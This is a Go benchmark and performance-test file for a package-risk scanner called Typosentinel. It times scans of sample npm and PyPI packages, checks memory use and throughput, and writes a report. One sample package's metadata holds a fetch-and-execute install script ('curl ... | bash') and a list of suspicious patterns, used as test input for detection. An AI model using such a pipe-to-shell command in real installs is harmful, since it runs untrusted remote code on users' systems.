package tests

import (
	"context"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"sync"
	"testing"
	"time"

	"github.com/Alivanroy/Typosentinel/internal/analyzer"
	"github.com/Alivanroy/Typosentinel/internal/config"
	"github.com/Alivanroy/Typosentinel/pkg/types"
)

// BenchmarkSuite contains performance benchmark tests
type BenchmarkSuite struct {
	scanner      *analyzer.Analyzer
	config       *config.Config
	tempDir      string
	testPackages []BenchmarkPackage
}

// BenchmarkPackage represents a package for benchmarking
type BenchmarkPackage struct {
	Name         string                 `json:"name"`
	Version      string                 `json:"version"`
	Registry     string                 `json:"registry"`
	Description  string                 `json:"description"`
	Metadata     map[string]interface{} `json:"metadata"`
	Category     string                 `json:"category"` // small, medium, large, complex
	ExpectedTime time.Duration          `json:"expected_time"`
}

// BenchmarkResult represents the result of a benchmark test
type BenchmarkResult struct {
	PackageName    string
	Category       string
	ProcessingTime time.Duration
	MemoryUsage    int64
	Allocations    int64
	EnginesUsed    []string
	RiskScore      float64
	Success        bool
	Error          string
}

// PerformanceMetrics contains aggregated performance metrics
type BenchmarkPerformanceMetrics struct {
	TotalTests      int
	SuccessfulTests int
	FailedTests     int
	AverageTime     time.Duration
	MedianTime      time.Duration
	P95Time         time.Duration
	P99Time         time.Duration
	MinTime         time.Duration
	MaxTime         time.Duration
	AverageMemory   int64
	TotalMemory     int64
	Throughput      float64 // packages per second
}

// SetupBenchmarkSuite initializes the benchmark test suite
func SetupBenchmarkSuite(b *testing.B) *BenchmarkSuite {
	// Create temporary directory
	tempDir, err := ioutil.TempDir("", "typosentinel-benchmark")
	if err != nil {
		b.Fatalf("Failed to create temp directory: %v", err)
	}

	// Create optimized configuration for benchmarking
	cfg := &config.Config{
		App: config.AppConfig{
			Name:        "Typosentinel",
			Version:     "1.0.0",
			Environment: "testing",
			Debug:       false,
			Verbose:     false,
			LogLevel:    "info",
			DataDir:     filepath.Join(tempDir, "data"),
			TempDir:     filepath.Join(tempDir, "temp"),
			MaxWorkers:  5,
		},
		Server: config.ServerConfig{
			Host:            "localhost",
			Port:            8080,
			ReadTimeout:     30 * time.Second,
			WriteTimeout:    30 * time.Second,
			IdleTimeout:     60 * time.Second,
			ShutdownTimeout: 10 * time.Second,
		},
		Database: config.DatabaseConfig{
			Type:            "sqlite",
			Database:        filepath.Join(tempDir, "test.db"),
			MaxOpenConns:    10,
			MaxIdleConns:    5,
			ConnMaxLifetime: 1 * time.Hour,
			MigrationsPath:  filepath.Join(tempDir, "migrations"),
		},
		Redis: config.RedisConfig{
			Enabled: false,
		},
		Logging: config.LoggingConfig{
			Level:      "info",
			Format:     "json",
			Output:     "stdout",
			MaxSize:    100,
			MaxBackups: 3,
			MaxAge:     7,
			Compress:   false,
		},
		Metrics: config.MetricsConfig{
			Enabled: false,
		},
		Security: config.SecurityConfig{},
		ML: config.MLConfig{
			Enabled:   false,
			ModelPath: filepath.Join(tempDir, "models", "model.pb"),
		},
		API: config.APIConfig{
			Prefix:  "/api",
			Version: "v1",
			REST: config.RESTAPIConfig{
				Enabled:  true,
				Host:     "localhost",
				Port:     8080,
				BasePath: "/api",
				Prefix:   "/v1",
				Version:  "1.0",
				Versioning: config.APIVersioning{
					Enabled:           true,
					Strategy:          "path",
					DefaultVersion:    "v1",
					SupportedVersions: []string{"v1", "v2"},
				},
			},
		},
		RateLimit: config.RateLimitConfig{
			Enabled: false,
		},
		Registries: config.RegistriesConfig{},
		Features:   config.FeatureConfig{},
		Policies:   config.PoliciesConfig{},
	}

	// Create scanner
	scanner, err := analyzer.New(cfg)
	if err != nil {
		b.Fatalf("Failed to create scanner: %v", err)
	}

	// Load benchmark packages
	testPackages := createBenchmarkPackages()

	return &BenchmarkSuite{
		scanner:      scanner,
		config:       cfg,
		tempDir:      tempDir,
		testPackages: testPackages,
	}
}

// TeardownBenchmarkSuite cleans up the benchmark suite
func (suite *BenchmarkSuite) TeardownBenchmarkSuite() {
	if suite.tempDir != "" {
		os.RemoveAll(suite.tempDir)
	}
}

// createBenchmarkPackages creates a set of packages for benchmarking
func createBenchmarkPackages() []BenchmarkPackage {
	return []BenchmarkPackage{
		// Small packages (fast processing)
		{
			Name:         "small-package-1",
			Version:      "1.0.0",
			Registry:     "npm",
			Description:  "A small test package",
			Category:     "small",
			ExpectedTime: 2 * time.Second,
			Metadata: map[string]interface{}{
				"downloads":    1000,
				"age":          365,
				"maintainers":  1,
				"dependencies": 2,
			},
		},
		{
			Name:         "small-package-2",
			Version:      "2.1.0",
			Registry:     "pypi",
			Description:  "Another small test package",
			Category:     "small",
			ExpectedTime: 2 * time.Second,
			Metadata: map[string]interface{}{
				"downloads":    5000,
				"age":          180,
				"maintainers":  2,
				"dependencies": 1,
			},
		},
		// Medium packages (moderate processing)
		{
			Name:         "medium-package-1",
			Version:      "3.2.1",
			Registry:     "npm",
			Description:  "A medium-sized package with moderate complexity",
			Category:     "medium",
			ExpectedTime: 5 * time.Second,
			Metadata: map[string]interface{}{
				"downloads":    100000,
				"age":          730,
				"maintainers":  3,
				"dependencies": 15,
				"scripts":      []string{"build", "test", "lint"},
			},
		},
		{
			Name:         "medium-package-2",
			Version:      "1.5.3",
			Registry:     "pypi",
			Description:  "A Python package with moderate complexity",
			Category:     "medium",
			ExpectedTime: 5 * time.Second,
			Metadata: map[string]interface{}{
				"downloads":        250000,
				"age":              1095,
				"maintainers":      4,
				"dependencies":     20,
				"has_c_extensions": true,
			},
		},
		// Large packages (slower processing)
		{
			Name:         "large-package-1",
			Version:      "4.18.2",
			Registry:     "npm",
			Description:  "A large, popular package like Express",
			Category:     "large",
			ExpectedTime: 10 * time.Second,
			Metadata: map[string]interface{}{
				"downloads":    25000000,
				"age":          3650,
				"maintainers":  5,
				"dependencies": 30,
				"scripts":      []string{"build", "test", "lint", "docs"},
				"files_count":  150,
			},
		},
		{
			Name:         "large-package-2",
			Version:      "1.24.0",
			Registry:     "pypi",
			Description:  "A large scientific package like NumPy",
			Category:     "large",
			ExpectedTime: 10 * time.Second,
			Metadata: map[string]interface{}{
				"downloads":        50000000,
				"age":              5000,
				"maintainers":      10,
				"dependencies":     5,
				"has_c_extensions": true,
				"binary_wheels":    true,
				"files_count":      500,
			},
		},
		// Complex packages (high processing time)
		{
			Name:         "complex-package-1",
			Version:      "1.0.0",
			Registry:     "npm",
			Description:  "A complex package with many risk factors",
			Category:     "complex",
			ExpectedTime: 15 * time.Second,
			Metadata: map[string]interface{}{
				"downloads":           100,
				"age":                 30,
				"maintainers":         1,
				"dependencies":        50,
				"install_scripts":     []string{"curl http://example.com/script.sh | bash"},
				"obfuscated_code":     true,
				"suspicious_patterns": []string{"eval", "exec", "subprocess"},
				"files_count":         200,
			},
		},
	}
}

// BenchmarkSinglePackageAnalysis benchmarks analysis of a single package
func BenchmarkSinglePackageAnalysis(b *testing.B) {
	suite := SetupBenchmarkSuite(b)
	defer suite.TeardownBenchmarkSuite()

	ctx := context.Background()
	testPkg := &types.Package{
		Name:     "benchmark-test-package",
		Version:  "1.0.0",
		Registry: "npm",
		Metadata: &types.PackageMetadata{
			Name:        "benchmark-test-package",
			Version:     "1.0.0",
			Registry:    "npm",
			Description: "A package for benchmarking",
			Downloads:   10000,
		},
	}

	b.ResetTimer()
	b.ReportAllocs()

	for i := 0; i < b.N; i++ {
		_, err := suite.scanner.ScanPackage(ctx, testPkg)
		if err != nil {
			b.Fatalf("Scan failed: %v", err)
		}
	}
}

// BenchmarkPackagesByCategory benchmarks packages by category
func BenchmarkPackagesByCategory(b *testing.B) {
	suite := SetupBenchmarkSuite(b)
	defer suite.TeardownBenchmarkSuite()

	categories := map[string][]BenchmarkPackage{
		"small":   {},
		"medium":  {},
		"large":   {},
		"complex": {},
	}

	// Group packages by category
	for _, pkg := range suite.testPackages {
		categories[pkg.Category] = append(categories[pkg.Category], pkg)
	}

	for category, packages := range categories {
		if len(packages) == 0 {
			continue
		}

		b.Run(category, func(b *testing.B) {
			ctx := context.Background()
			pkgIndex := 0

			b.ResetTimer()
			b.ReportAllocs()

			for i := 0; i < b.N; i++ {
				pkg := packages[pkgIndex%len(packages)]
				testPkg := &types.Package{
					Name:     pkg.Name,
					Version:  pkg.Version,
					Registry: pkg.Registry,
					Metadata: &types.PackageMetadata{
						Name:        pkg.Name,
						Version:     pkg.Version,
						Registry:    pkg.Registry,
						Description: pkg.Description,
					},
				}

				_, err := suite.scanner.ScanPackage(ctx, testPkg)
				if err != nil {
					b.Fatalf("Scan failed for %s: %v", pkg.Name, err)
				}

				pkgIndex++
			}
		})
	}
}

// BenchmarkConcurrentAnalysis benchmarks concurrent package analysis
func BenchmarkConcurrentAnalysis(b *testing.B) {
	suite := SetupBenchmarkSuite(b)
	defer suite.TeardownBenchmarkSuite()

	concurrencyLevels := []int{1, 2, 4, 8, 16}

	for _, concurrency := range concurrencyLevels {
		b.Run(fmt.Sprintf("concurrency_%d", concurrency), func(b *testing.B) {
			ctx := context.Background()
			packages := suite.testPackages[:min(len(suite.testPackages), concurrency*2)]

			b.ResetTimer()
			b.ReportAllocs()

			for i := 0; i < b.N; i++ {
				var wg sync.WaitGroup
				semaphore := make(chan struct{}, concurrency)

				for j, pkg := range packages {
					wg.Add(1)
					go func(pkg BenchmarkPackage, index int) {
						defer wg.Done()
						semaphore <- struct{}{}
						defer func() { <-semaphore }()

						testPkg := &types.Package{
							Name:     fmt.Sprintf("%s-%d", pkg.Name, index),
							Version:  pkg.Version,
							Registry: pkg.Registry,
							Metadata: &types.PackageMetadata{
								Name:        fmt.Sprintf("%s-%d", pkg.Name, index),
								Version:     pkg.Version,
								Registry:    pkg.Registry,
								Description: pkg.Description,
							},
						}

						_, err := suite.scanner.ScanPackage(ctx, testPkg)
						if err != nil {
							b.Errorf("Scan failed for %s: %v", testPkg.Name, err)
						}
					}(pkg, j)
				}

				wg.Wait()
			}
		})
	}
}

// BenchmarkMemoryUsage benchmarks memory usage patterns
func BenchmarkMemoryUsage(b *testing.B) {
	suite := SetupBenchmarkSuite(b)
	defer suite.TeardownBenchmarkSuite()

	ctx := context.Background()
	testPkg := &types.Package{
		Name:     "memory-test-package",
		Version:  "1.0.0",
		Registry: "npm",
		Metadata: &types.PackageMetadata{
			Name:        "memory-test-package",
			Version:     "1.0.0",
			Registry:    "npm",
			Description: "A package for memory benchmarking",
			Downloads:   100000,
		},
	}

	b.ResetTimer()
	b.ReportAllocs()

	var m1, m2 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m1)

	for i := 0; i < b.N; i++ {
		_, err := suite.scanner.ScanPackage(ctx, testPkg)
		if err != nil {
			b.Fatalf("Memory benchmark failed: %v", err)
		}
	}

	runtime.GC()
	runtime.ReadMemStats(&m2)

	b.Logf("Memory usage per operation: %d bytes", (m2.TotalAlloc-m1.TotalAlloc)/uint64(b.N))
	b.Logf("Heap objects per operation: %d", (m2.HeapObjects-m1.HeapObjects)/uint64(b.N))
}

// TestPerformanceRegression tests for performance regressions
func TestPerformanceRegression(t *testing.T) {
	suite := SetupBenchmarkSuite(&testing.B{})
	defer suite.TeardownBenchmarkSuite()

	ctx := context.Background()
	results := make([]BenchmarkResult, 0, len(suite.testPackages))

	// Run performance tests
	for _, benchPkg := range suite.testPackages {
		t.Run(fmt.Sprintf("performance_%s_%s", benchPkg.Category, benchPkg.Name), func(t *testing.T) {
			result := suite.runPerformanceTest(ctx, benchPkg)
			results = append(results, result)

			if !result.Success {
				t.Errorf("Performance test failed for %s: %s", benchPkg.Name, result.Error)
				return
			}

			// Check if processing time exceeds expected time by more than 50%
			maxAllowedTime := time.Duration(float64(benchPkg.ExpectedTime) * 1.5)
			if result.ProcessingTime > maxAllowedTime {
				t.Errorf("Performance regression detected for %s: expected ≤%v, got %v",
					benchPkg.Name, maxAllowedTime, result.ProcessingTime)
			}

			// Check memory usage is reasonable (less than 100MB per package)
			if result.MemoryUsage > 100*1024*1024 {
				t.Errorf("Excessive memory usage for %s: %d bytes", benchPkg.Name, result.MemoryUsage)
			}

			t.Logf("Performance test passed for %s: %v (memory: %d bytes)",
				benchPkg.Name, result.ProcessingTime, result.MemoryUsage)
		})
	}

	// Generate performance report
	metrics := suite.calculatePerformanceMetrics(results)
	suite.generatePerformanceReport(t, metrics, results)
}

// runPerformanceTest runs a single performance test
func (suite *BenchmarkSuite) runPerformanceTest(ctx context.Context, benchPkg BenchmarkPackage) BenchmarkResult {
	var m1, m2 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m1)

	startTime := time.Now()

	testPkg := &types.Package{
		Name:     benchPkg.Name,
		Version:  benchPkg.Version,
		Registry: benchPkg.Registry,
		Metadata: &types.PackageMetadata{
			Name:        benchPkg.Name,
			Version:     benchPkg.Version,
			Registry:    benchPkg.Registry,
			Description: benchPkg.Description,
		},
	}

	scanResult, err := suite.scanner.ScanPackage(ctx, testPkg)
	processingTime := time.Since(startTime)

	runtime.GC()
	runtime.ReadMemStats(&m2)

	result := BenchmarkResult{
		PackageName:    benchPkg.Name,
		Category:       benchPkg.Category,
		ProcessingTime: processingTime,
		MemoryUsage:    int64(m2.TotalAlloc - m1.TotalAlloc),
		Allocations:    int64(m2.Mallocs - m1.Mallocs),
		Success:        err == nil,
	}

	if err != nil {
		result.Error = err.Error()
	} else {
		result.EnginesUsed = scanResult.Summary.EnginesUsed
		result.RiskScore = scanResult.RiskScore
	}

	return result
}

// calculatePerformanceMetrics calculates aggregated performance metrics
func (suite *BenchmarkSuite) calculatePerformanceMetrics(results []BenchmarkResult) BenchmarkPerformanceMetrics {
	if len(results) == 0 {
		return BenchmarkPerformanceMetrics{}
	}

	successfulResults := make([]BenchmarkResult, 0, len(results))
	times := make([]time.Duration, 0, len(results))
	totalMemory := int64(0)
	successCount := 0

	for _, result := range results {
		if result.Success {
			successfulResults = append(successfulResults, result)
			times = append(times, result.ProcessingTime)
			totalMemory += result.MemoryUsage
			successCount++
		}
	}

	if len(times) == 0 {
		return BenchmarkPerformanceMetrics{
			TotalTests:  len(results),
			FailedTests: len(results),
		}
	}

	// Sort times for percentile calculations
	sort.Slice(times, func(i, j int) bool {
		return times[i] < times[j]
	})

	// Calculate average time
	totalTime := time.Duration(0)
	for _, t := range times {
		totalTime += t
	}
	averageTime := totalTime / time.Duration(len(times))

	// Calculate percentiles
	medianTime := times[len(times)/2]
	p95Index := int(math.Ceil(float64(len(times))*0.95)) - 1
	p99Index := int(math.Ceil(float64(len(times))*0.99)) - 1
	p95Time := times[p95Index]
	p99Time := times[p99Index]
	minTime := times[0]
	maxTime := times[len(times)-1]

	// Calculate throughput (packages per second)
	throughput := float64(len(times)) / totalTime.Seconds()

	return BenchmarkPerformanceMetrics{
		TotalTests:      len(results),
		SuccessfulTests: successCount,
		FailedTests:     len(results) - successCount,
		AverageTime:     averageTime,
		MedianTime:      medianTime,
		P95Time:         p95Time,
		P99Time:         p99Time,
		MinTime:         minTime,
		MaxTime:         maxTime,
		AverageMemory:   totalMemory / int64(len(successfulResults)),
		TotalMemory:     totalMemory,
		Throughput:      throughput,
	}
}

// generatePerformanceReport generates a comprehensive performance report
func (suite *BenchmarkSuite) generatePerformanceReport(t *testing.T, metrics BenchmarkPerformanceMetrics, results []BenchmarkResult) {
	t.Logf("\n=== Performance Test Report ===")
	t.Logf("Total Tests: %d", metrics.TotalTests)
	t.Logf("Successful: %d (%.1f%%)", metrics.SuccessfulTests, float64(metrics.SuccessfulTests)/float64(metrics.TotalTests)*100)
	t.Logf("Failed: %d (%.1f%%)", metrics.FailedTests, float64(metrics.FailedTests)/float64(metrics.TotalTests)*100)

	t.Logf("\n--- Timing Metrics ---")
	t.Logf("Average Time: %v", metrics.AverageTime)
	t.Logf("Median Time: %v", metrics.MedianTime)
	t.Logf("95th Percentile: %v", metrics.P95Time)
	t.Logf("99th Percentile: %v", metrics.P99Time)
	t.Logf("Min Time: %v", metrics.MinTime)
	t.Logf("Max Time: %v", metrics.MaxTime)
	t.Logf("Throughput: %.2f packages/second", metrics.Throughput)

	t.Logf("\n--- Memory Metrics ---")
	t.Logf("Average Memory per Package: %d bytes (%.2f MB)", metrics.AverageMemory, float64(metrics.AverageMemory)/(1024*1024))
	t.Logf("Total Memory Used: %d bytes (%.2f MB)", metrics.TotalMemory, float64(metrics.TotalMemory)/(1024*1024))

	// Category breakdown
	categoryMetrics := make(map[string][]BenchmarkResult)
	for _, result := range results {
		if result.Success {
			categoryMetrics[result.Category] = append(categoryMetrics[result.Category], result)
		}
	}

	t.Logf("\n--- Performance by Category ---")
	for category, categoryResults := range categoryMetrics {
		if len(categoryResults) == 0 {
			continue
		}

		totalTime := time.Duration(0)
		totalMemory := int64(0)
		for _, result := range categoryResults {
			totalTime += result.ProcessingTime
			totalMemory += result.MemoryUsage
		}

		avgTime := totalTime / time.Duration(len(categoryResults))
		avgMemory := totalMemory / int64(len(categoryResults))

		t.Logf("%s: %d tests, avg time: %v, avg memory: %.2f MB",
			category, len(categoryResults), avgTime, float64(avgMemory)/(1024*1024))
	}

	// Failed tests
	if metrics.FailedTests > 0 {
		t.Logf("\n--- Failed Tests ---")
		for _, result := range results {
			if !result.Success {
				t.Logf("%s (%s): %s", result.PackageName, result.Category, result.Error)
			}
		}
	}

	// Save detailed report
	reportPath := filepath.Join(suite.tempDir, "performance_report.json")
	if err := suite.savePerformanceReport(metrics, results, reportPath); err != nil {
		t.Logf("Warning: Failed to save performance report: %v", err)
	}
}

// savePerformanceReport saves the performance report to a file
func (suite *BenchmarkSuite) savePerformanceReport(metrics BenchmarkPerformanceMetrics, results []BenchmarkResult, filePath string) error {
	report := map[string]interface{}{
		"timestamp": time.Now(),
		"metrics":   metrics,
		"results":   results,
		"system_info": map[string]interface{}{
			"go_version":    runtime.Version(),
			"go_os":         runtime.GOOS,
			"go_arch":       runtime.GOARCH,
			"num_cpu":       runtime.NumCPU(),
			"num_goroutine": runtime.NumGoroutine(),
		},
	}

	data, err := json.MarshalIndent(report, "", "  ")
	if err != nil {
		return err
	}

	return ioutil.WriteFile(filePath, data, 0644)
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// TestThroughputUnderLoad tests system throughput under sustained load
func TestThroughputUnderLoad(t *testing.T) {
	suite := SetupBenchmarkSuite(&testing.B{})
	defer suite.TeardownBenchmarkSuite()

	ctx := context.Background()
	duration := 30 * time.Second
	concurrency := 4

	packageTemplate := &types.Package{
		Name:     "load-test-package",
		Version:  "1.0.0",
		Registry: "npm",
		Metadata: &types.PackageMetadata{
			Name:        "load-test-package",
			Version:     "1.0.0",
			Registry:    "npm",
			Description: "A package for load testing",
			Downloads:   10000,
		},
	}

	startTime := time.Now()
	var completedScans int64
	var failedScans int64
	var wg sync.WaitGroup

	// Start concurrent workers
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			packageCounter := 0

			for time.Since(startTime) < duration {
				testPkg := &types.Package{
					Name:     fmt.Sprintf("%s-worker%d-pkg%d", packageTemplate.Name, workerID, packageCounter),
					Version:  packageTemplate.Version,
					Registry: packageTemplate.Registry,
					Metadata: &types.PackageMetadata{
						Name:        fmt.Sprintf("%s-worker%d-pkg%d", packageTemplate.Name, workerID, packageCounter),
						Version:     packageTemplate.Version,
						Registry:    packageTemplate.Registry,
						Description: packageTemplate.Metadata.Description,
						Downloads:   packageTemplate.Metadata.Downloads,
					},
				}

				_, err := suite.scanner.ScanPackage(ctx, testPkg)
				if err != nil {
					failedScans++
				} else {
					completedScans++
				}

				packageCounter++
			}
		}(i)
	}

	wg.Wait()
	totalTime := time.Since(startTime)

	throughput := float64(completedScans) / totalTime.Seconds()
	successRate := float64(completedScans) / float64(completedScans+failedScans) * 100

	t.Logf("\n=== Throughput Test Results ===")
	t.Logf("Duration: %v", totalTime)
	t.Logf("Concurrency: %d workers", concurrency)
	t.Logf("Completed Scans: %d", completedScans)
	t.Logf("Failed Scans: %d", failedScans)
	t.Logf("Success Rate: %.2f%%", successRate)
	t.Logf("Throughput: %.2f packages/second", throughput)

	// Performance assertions
	if throughput < 1.0 {
		t.Errorf("Throughput too low: %.2f packages/second (expected ≥ 1.0)", throughput)
	}

	if successRate < 95.0 {
		t.Errorf("Success rate too low: %.2f%% (expected ≥ 95%%)", successRate)
	}
}
